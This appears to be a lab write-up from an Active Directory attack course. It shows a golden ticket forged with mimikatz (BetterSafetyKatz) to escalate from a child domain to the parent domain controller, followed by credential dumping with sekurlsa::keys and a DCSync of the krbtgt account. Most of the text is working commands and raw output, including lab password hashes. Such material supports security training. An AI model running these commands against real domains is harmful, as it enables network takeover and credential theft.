# Hands-On 21
```
Using DA access to us.techcorp.local, escalate privileges to Enterprise Admin or DA to the parent
domain, techcorp.local using the krbtgt hash of us.techcorp.local.
```
## Index Of Content:

  1. [Escalate Privileges](#escalate-privileges)


##Escalate Privileges

Create new Golden ticket :

```
C:\Users\studentuser17>C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:us.techcorp.local  /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /krbtgt:b0975ae49f441adc6b024ad238935af5 /ptt"
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # kerberos::golden /user:Administrator /domain:us.techcorp.local  /sid:S-1-5-21-210670787-2521448726-163245708 /sids:S-1-5-21-2781415573-3701854478-2406986946-519 /krbtgt:b0975ae49f441adc6b024ad238935af5 /ptt
User      : Administrator
Domain    : us.techcorp.local (US)
SID       : S-1-5-21-210670787-2521448726-163245708
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-2781415573-3701854478-2406986946-519 ;
ServiceKey: b0975ae49f441adc6b024ad238935af5 - rc4_hmac_nt
Lifetime  : 3/4/2023 4:41:12 AM ; 3/1/2033 4:41:12 AM ; 3/1/2033 4:41:12 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ us.techcorp.local' successfully submitted for current session

```
Validate the ticket:
```
C:\Users\studentuser17>klist

Current LogonId is 0:0xb265ddf

Cached Tickets: (1)

#0>     Client: Administrator @ us.techcorp.local
        Server: krbtgt/us.techcorp.local @ us.techcorp.local
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/4/2023 4:41:12 (local)
        End Time:   3/1/2033 4:41:12 (local)
        Renew Time: 3/1/2033 4:41:12 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

```
Access to the C$ resource of teh target machine and validate the TGS:
```
C:\Users\studentuser17>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\studentuser17> ls \\techcorp-dc.techcorp.local\C$


    Directory: \\techcorp-dc.techcorp.local\C$


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/10/2019   9:00 AM                ExchangeSetupLogs
d-----        12/7/2020   2:51 AM                PerfLogs
d-r---         1/6/2021  12:49 AM                Program Files
d-----        7/17/2019  11:02 PM                Program Files (x86)
d-----       12/26/2022   3:04 AM                Transcripts
d-r---        7/18/2019   9:48 AM                Users
d-----       10/16/2022   4:52 AM                Windows


```

Open a remote PSSession:

```
PS C:\Users\studentuser17> Enter-PSSession techcorp-dc.techcorp.local
[techcorp-dc.techcorp.local]: PS C:\Users\Administrator.US\Documents> hostname
Techcorp-DC
[techcorp-dc.techcorp.local]: PS C:\Users\Administrator.US\Documents> whoami
us\administrator
[techcorp-dc.techcorp.local]: PS C:\Users\Administrator.US\Documents>

```

Dump credentials with administrator privileges:

```
[techcorp-dc.techcorp.local]: PS C:\Users\Administrator.US\Documents> exit
PS C:\Users\studentuser17> echo F | xcopy C:\AD\Tools\BetterSafetyKatz.exe \\techcorp-dc.techcorp.local\C$\Users\Public\
C:\AD\Tools\BetterSafetyKatz.exe
1 File(s) copied
PS C:\Users\studentuser17> winrs -r:techcorp-dc.techcorp.local cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator.US>cd C:\Users\Public
cd C:\Users\Public

C:\Users\Public>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of C:\Users\Public

03/04/2023  04:54 AM    <DIR>          .
03/04/2023  04:54 AM    <DIR>          ..
03/04/2023  03:35 AM         1,989,632 BetterSafetyKatz.exe
05/25/2019  02:22 AM    <DIR>          Documents
09/14/2018  11:19 PM    <DIR>          Downloads
09/14/2018  11:19 PM    <DIR>          Music
09/14/2018  11:19 PM    <DIR>          Pictures
09/14/2018  11:19 PM    <DIR>          Videos
               1 File(s)      1,989,632 bytes
               7 Dir(s)  14,070,611,968 bytes free

C:\Users\Public>.\BetterSafetyKatz.exe
.\BetterSafetyKatz.exe
[+] Stolen from @harmj0y, @TheRealWover, @cobbr_io and @gentilkiwi, repurposed by @Flangvik and @Mrtn9
[+] Randomizing strings in memory
[+] Suicide burn before CreateThread!

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::keys

Authentication Id : 0 ; 888745 (00000000:000d8fa9)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:40:45 AM
SID               : S-1-5-90-0-2

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 886988 (00000000:000d88cc)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:40:44 AM
SID               : S-1-5-96-0-2

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 53050 (00000000:0000cf3a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-90-0-1

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 33905 (00000000:00008471)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-96-0-1

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 1001854 (00000000:000f497e)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : TECHCORP
Logon Server      : TECHCORP-DC
Logon Time        : 12/26/2022 2:42:30 AM
SID               : S-1-5-21-2781415573-3701854478-2406986946-500

         * Username : Administrator
         * Domain   : TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       58db3c598315bf030d4f1f07021d364ba9350444e3f391e167938dd998836883
           rc4_hmac_nt       bc4cf9b751d196c4b6e1a2ba923ef33f
           rc4_hmac_old      bc4cf9b751d196c4b6e1a2ba923ef33f
           rc4_md4           bc4cf9b751d196c4b6e1a2ba923ef33f
           rc4_hmac_nt_exp   bc4cf9b751d196c4b6e1a2ba923ef33f
           rc4_hmac_old_exp  bc4cf9b751d196c4b6e1a2ba923ef33f

Authentication Id : 0 ; 888479 (00000000:000d8e9f)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:40:45 AM
SID               : S-1-5-90-0-2

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 33882 (00000000:0000845a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-96-0-0

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : TECHCORP-DC$
Domain            : TECHCORP
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:08 AM
SID               : S-1-5-18

         * Username : techcorp-dc$
         * Domain   : TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       6a658f7eda93e002d5107ef9cb923448c7139252955fee24ee4960c3fb7869f3
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 887057 (00000000:000d8911)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:40:44 AM
SID               : S-1-5-96-0-2

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 53012 (00000000:0000cf14)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-90-0-1

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : TECHCORP-DC$
Domain            : TECHCORP
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-20

         * Username : techcorp-dc$
         * Domain   : TECHCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       6a658f7eda93e002d5107ef9cb923448c7139252955fee24ee4960c3fb7869f3
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 33943 (00000000:00008497)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-96-0-1

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db

Authentication Id : 0 ; 33927 (00000000:00008487)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/26/2022 2:38:12 AM
SID               : S-1-5-96-0-0

         * Username : TECHCORP-DC$
         * Domain   : techcorp.local
         * Password : 8e df 48 44 63 d3 7d 4d 34 e5 c6 7e 8f 4f 71 81 f9 26 1e cf 72 9d 5f bc c4 5b 08 93 71 17 79 f5 90 2f 71 d9 9f 52 53 52 b5 1d 01 a6 34 8e f7 a2 80 97 66 0c 9c 5b 2b 99 7f ab b7 32 1d 79 69 14 b8 f4 0c 58 2d 1d b9 68 6f c7 9d 51 ad 5f 9a 88 86 47 e7 c8 c8 6d cc 69 fb 64 a5 cd c4 fe 08 dc 54 e7 6c 88 10 92 d9 92 b0 eb 9b 8d 78 9d 13 26 e5 6b 5e 30 7d 45 14 d8 d0 96 5e 36 b6 11 a2 13 05 90 07 6b bc a6 fb 5e 5e 36 ac 6d ce 15 78 29 51 21 c4 97 d1 bd 63 b9 46 f9 c3 1b c4 06 31 b2 3b f9 2f 6b 40 23 fd 19 6d 68 2e d7 f5 a1 cf a0 a6 e2 58 23 81 70 cb 71 e0 f1 2e aa 4d 5d 61 eb b3 90 d4 65 67 23 ec e4 64 48 d3 39 ca 45 17 26 fc 9c cd b9 61 56 32 1d f3 d1 fb ca 48 0e 34 58 aa 33 0e 2b 23 3c 4b ef 53 ea 53 82 d1 f4 ce 7d
         * Key List :
           aes256_hmac       c2a76c5d88afb9446ccaa365841ac9c706dd9b4b3a47697006a29c40710966c1
           aes128_hmac       9d763ac1cbacac6350e62bfe6d2dfeaf
           rc4_hmac_nt       bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old      bf873f681eac2a97ec7e625c47dbb9db
           rc4_md4           bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_nt_exp   bf873f681eac2a97ec7e625c47dbb9db
           rc4_hmac_old_exp  bf873f681eac2a97ec7e625c47dbb9db


```
DUmp krbtgt with dcsync attack:
```
mimikatz # lsadump::dcsync /domain:techcorp.local /user:techcorp\krbtgt
[DC] 'techcorp.local' will be the domain
[DC] 'Techcorp-DC.techcorp.local' will be the DC server
[DC] 'techcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 7/4/2019 1:52:52 AM
Object Security ID   : S-1-5-21-2781415573-3701854478-2406986946-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 7735b8be1edda5deea6bfbacb7f2c3e7
    ntlm- 0: 7735b8be1edda5deea6bfbacb7f2c3e7
    lm  - 0: 295fa3fef874b54f29fd097c204220f0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 9fe386f0ebd8045b1826f80e3af94aed

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECHCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 290ab2e5a0592c76b7fcc5612ab489e9663e39d2b2306e053c8b09df39afae52
      aes128_hmac       (4096) : ac670a0db8f81733cdc7ea839187d024
      des_cbc_md5       (4096) : 977526ab75ea8691

* Primary:Kerberos *
    Default Salt : TECHCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 977526ab75ea8691

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
